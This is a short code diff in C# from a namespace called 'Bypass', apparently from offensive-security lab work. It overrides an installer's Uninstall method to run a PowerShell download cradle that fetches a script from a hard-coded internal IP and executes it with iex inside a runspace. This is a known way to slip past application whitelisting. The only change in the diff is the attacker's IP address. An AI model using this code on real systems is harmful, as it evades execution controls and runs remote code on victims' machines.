@@ -17,7 +17,7 @@ namespace Bypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.49.67/run.txt') | iex";
+            String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.49.102/run.txt') | iex";
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
             PowerShell ps = PowerShell.Create();
